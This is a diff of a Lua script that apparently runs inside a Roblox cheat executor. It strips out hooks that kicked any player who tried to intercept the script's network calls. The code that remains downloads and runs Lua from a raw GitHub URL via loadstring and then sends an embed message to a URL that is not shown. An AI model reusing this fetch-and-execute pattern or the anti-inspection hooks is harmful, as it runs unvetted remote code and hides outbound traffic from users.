@@ -1,28 +1,4 @@
 if request and hookfunction then
-    local oldh
-    local oldr
-
-    getgenv().hd = true
-    oldr = hookfunction(request, function(...)
-        local args = {...}
-        if not getgenv().hd then
-            return oldr(...)
-        else
-            game.Players.LocalPlayer:Kick("error:299")
-            return nil
-        end
-    end)
-    oldh = hookfunction(hookfunction, function(...)
-        local args = {...}
-        if not getgenv().hd then
-            return oldh(...)
-        else
-            game.Players.LocalPlayer:Kick("error:301")
-            return nil
-        end
-    end)
-
-
     local function gam()
         local thumbnail_url = "https://thumbnails.roblox.com/v1/places/gameicons?placeIds="..tostring(game.PlaceId).."&size=256x256&format=Png&isCircular=false"
         local response = game:HttpGet(thumbnail_url)
@@ -44,9 +20,7 @@ if request and hookfunction then
     end
 
     local function getunc()
-        getgenv().hd = false
         local unc = tostring(loadstring(game:HttpGet("https://raw.githubusercontent.com/tym487ty78/yyyyyyyy1/refs/heads/main/returnc.lua"))()) .. "%"
-        getgenv().hd = true
         return unc
     end
 
@@ -94,6 +68,3 @@ if request and hookfunction then
 
     SendMessageEMBED(url)
 end
-
-getgenv().hd = nil
-table.remove(getgenv(), hd)
